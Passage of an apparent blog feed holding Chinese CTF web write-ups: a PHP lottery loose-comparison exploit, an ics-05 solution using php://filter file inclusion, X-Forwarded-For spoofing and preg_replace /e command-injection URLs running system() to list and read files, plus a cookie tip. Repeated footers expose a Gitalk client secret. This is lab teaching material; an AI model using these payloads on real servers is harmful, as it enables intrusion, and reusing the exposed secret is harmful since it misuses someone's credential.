250);</span><br><span class="line"></span><br><span class="line">	if(!$cstrong)&#123;</span><br><span class="line">		response_error(&#39;server need be checked, tell admin&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$num &#x2F;&#x3D; 25;</span><br><span class="line">	return strval(floor($num));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function random_win_nums()&#123;</span><br><span class="line">	$result &#x3D; &#39;&#39;;</span><br><span class="line">	for($i&#x3D;0; $i&lt;7; $i++)&#123;</span><br><span class="line">		$result .&#x3D; random_num();</span><br><span class="line">	&#125;</span><br><span class="line">	return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function buy($req)&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(2);</span><br><span class="line"></span><br><span class="line">	$money &#x3D; $_SESSION[&#39;money&#39;];</span><br><span class="line">	$numbers &#x3D; $req[&#39;numbers&#39;];</span><br><span class="line">	$win_numbers &#x3D; random_win_nums();</span><br><span class="line">	$same_count &#x3D; 0;</span><br><span class="line">	for($i&#x3D;0; $i&lt;7; $i++)&#123;</span><br><span class="line">		if($numbers[$i] &#x3D;&#x3D; $win_numbers[$i])&#123;</span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	switch ($same_count) &#123;</span><br><span class="line">		case 2:</span><br><span class="line">			$prize &#x3D; 5;</span><br><span class="line">			break;</span><br><span class="line">		case 3:</span><br><span class="line">			$prize &#x3D; 20;</span><br><span class="line">			break;</span><br><span class="line">		case 4:</span><br><span class="line">			$prize &#x3D; 300;</span><br><span class="line">			break;</span><br><span class="line">		case 5:</span><br><span class="line">			$prize &#x3D; 1800;</span><br><span class="line">			break;</span><br><span class="line">		case 6:</span><br><span class="line">			$prize &#x3D; 200000;</span><br><span class="line">			break;</span><br><span class="line">		case 7:</span><br><span class="line">			$prize &#x3D; 5000000;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			$prize &#x3D; 0;</span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">	$money +&#x3D; $prize - 2;</span><br><span class="line">	$_SESSION[&#39;money&#39;] &#x3D; $money;</span><br><span class="line">	response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;,&#39;numbers&#39;&#x3D;&gt;$numbers, &#39;win_numbers&#39;&#x3D;&gt;$win_numbers, &#39;money&#39;&#x3D;&gt;$money, &#39;prize&#39;&#x3D;&gt;$prize]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function flag($req)&#123;</span><br><span class="line">	global $flag;</span><br><span class="line">	global $flag_price;</span><br><span class="line"></span><br><span class="line">	require_registered();</span><br><span class="line">	$money &#x3D; $_SESSION[&#39;money&#39;];</span><br><span class="line">	if($money &lt; $flag_price)&#123;</span><br><span class="line">		response_error(&#39;you don\&#39; have enough money&#39;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$money -&#x3D; $flag_price;</span><br><span class="line">		$_SESSION[&#39;money&#39;] &#x3D; $money;</span><br><span class="line">		$msg &#x3D; &#39;Here is your flag: &#39; . $flag;</span><br><span class="line">		response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;,&#39;msg&#39;&#x3D;&gt;$msg, &#39;money&#39;&#x3D;&gt;$money]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function register($req)&#123;</span><br><span class="line">	$name &#x3D; $req[&#39;name&#39;];</span><br><span class="line">	$_SESSION[&#39;name&#39;] &#x3D; $name;</span><br><span class="line">	$_SESSION[&#39;money&#39;] &#x3D; 20;</span><br><span class="line"></span><br><span class="line">	response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">switch ($data[&#39;action&#39;]) &#123;</span><br><span class="line">	case &#39;buy&#39;:</span><br><span class="line">		require_keys($data, [&#39;numbers&#39;]);</span><br><span class="line">		buy($data);</span><br><span class="line">		break;</span><br><span class="line"></span><br><span class="line">	case &#39;flag&#39;:</span><br><span class="line">		flag($data);</span><br><span class="line">		break;</span><br><span class="line"></span><br><span class="line">	case &#39;register&#39;:</span><br><span class="line">		require_keys($data, [&#39;name&#39;]);</span><br><span class="line">		register($data);</span><br><span class="line">		break;</span><br><span class="line">	</span><br><span class="line">	default:</span><br><span class="line">		response_error(&#39;invalid request&#39;);</span><br><span class="line">		break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</details>

<br>

<p>（1）requests是json格式<br>（2）玩家输入的彩票数字与系统随机生成的数字对比为==弱比较<br>（3）并且比较为一位一位的比较</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0; <span class="variable">$i</span>&lt;7; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">		<span class="variable">$same_count</span>++;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>



<br>

<p>5.已知为php弱比较型，利用Burp Suite传包，进行数字比较时，使得任何数字都与系统生成数字相等，即ture。<br>post数据是action，调用buy函数。以及我们输入的数字number。不停的传包，使得我们获得足够的钱，购买flag。</p>
<br>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"action"</span>:<span class="string">"buy"</span>,<span class="string">"numbers"</span>:[<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>]&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="3.PNG" alt=""></p>
<div class="note info"><p>0x04 参考</p></div>
1.<a href="https://www.jianshu.com/p/911ec94e8259" target="_blank">lottery!（about /.git）</a><br>

<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 目录遍历 </tag>
            
            <tag> git源码泄露 </tag>
            
            <tag> robots协议的利用 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP 弱类型比较 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-cis05]]></title>
      <url>/2019/12/24/ctf-ics-05/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>

<p>1.<a href="https://www.cnblogs.com/likai/archive/2010/01/29/1659336.html" target="_blank">php内置封装协议 filter</a><br>2.伪造IP<br>3.preg_replace()函数的/e漏洞<br>4.正确的php system()函数的书写</p>
 <a id="more"></a>


<div class="note info"><p>0x02 解题流程与思路</p></div>
1.打开题目网页点击尝试，发现只有维护中心可以点击

<p><img src="1.png" alt=""></p>
<br>

<ol start="2">
<li>F12查看源代码，可以看到代码段?page=index，同时网页表现为 xxxx/index.php，此时可以猜测题目可能为文件包含读取网页的漏洞。利用php内置filter协议协助网页传参，查看结果。</li>
</ol>
<br>
2_1.
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=<span class="string">"layui-nav-item layui-this"</span>&gt;&lt;a href=<span class="string">"?page=index"</span>&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p><img src="2.PNG" alt=""></p>
<br>

<p>3.转码获得源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>3_1.代码审计<br>（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP<br>（1_1）可以看到我们登陆成功<br><img src="3.PNG" alt=""></p>
<p>（2）<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>    简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace (<span class="variable">$pattern</span> , <span class="variable">$replacement</span> ,  <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="variable">$pattern</span>:       搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"><span class="variable">$replacement</span>:   用于替换的字符串或字符串数组。</span><br><span class="line"><span class="variable">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span><br><span class="line">关于/e：</span><br><span class="line"> 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。</span><br><span class="line"> 潜在威胁： 当replacement为可控时，可以直接编写一句话木马</span><br></pre></td></tr></table></figure></div>
<p>（2_2）利用漏洞寻找flag<br>    %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="4.PNG" alt=""></p>
<p>(2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="5.PNG" alt=""><br>（2_4）找到flag文件夹后，继续cd，寻找所需的flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="6.PNG" alt=""><br>(2_5)确认flag所在的文件，直接抓取内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
<p><img src="7.PNG" alt=""><br>成功找到flag</p>
<div class="note info"><p>0x03 解题过程中存在的问题</p></div>
1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试



<div class="note info"><p>0x04 参考</p></div>
1.<a href="https://blog.csdn.net/zhwho/article/details/100694073" target="_blank">攻防世界web进阶ics-05 wp</a><br>
2.<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>
3.<a href="https://blog.csdn.net/About23/article/details/95349625" target="_blank">攻防世界ics-5wp</a><br>



<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php内置filter协议 </tag>
            
            <tag> 伪造IP </tag>
            
            <tag> preg_replace()函数的/e漏洞 </tag>
            
            <tag> 正确的php system()函数的书写 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-cookie基础题]]></title>
      <url>/2019/12/24/pb%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 攻防世界web新手区cookie题</p></div>
    常规网上搜到的都是用burp suits做的，其实没必要这么麻烦，查看问题的讨论发现可以直接通过火狐浏览器 F12查看存储，获得cookie，然后查看网络获得flag <br>
    Chrome浏览器可以通过控制台输入alert(document.cookie)查看cookie cookie
<div class="note info"><p>0x02 图流程</p></div>

<p><img src="2.png" alt=""></p>
<p><img src="1.png" alt=""></p>
<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB基础 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 抓包基础题 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[低估的Web威胁-备份文件]]></title>
      <url>/2019/12/24/CTF-python3%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01二进制转字符串</p></div>
<details>
<summary>二进制转字符串</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"># gif 二进制转字符串</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">a &#x3D; &#39;01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101&#39;</span><br><span class="line">b &#x3D; re.findall(r&#39;.&#123;8&#125;&#39;,a)</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in b:</span><br><span class="line">    flag +&#x3D; chr(int(i,2))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>
</details>


<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;div class=<span class="string">"note danger"</span>&gt;&lt;p&gt;0x02没有删除版本控制系统产生的备份文件&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">	几乎所有的控制系统VCS都会在工程目录下建一个meta目录，这个文件记录了整个项目工程每次修改的记录。</span><br><span class="line">而开发者修改项目仓库的时候就直接下载/克隆代码仓库，改为后直接上传到web服务器上。但是很多时候，VCS产生的目录并没有删除掉，这样的话，如果被攻击者找到，将会使整个工程泄露。</span><br><span class="line"></span><br><span class="line">&#123;% note default %&#125; default &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python3 工具合集 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
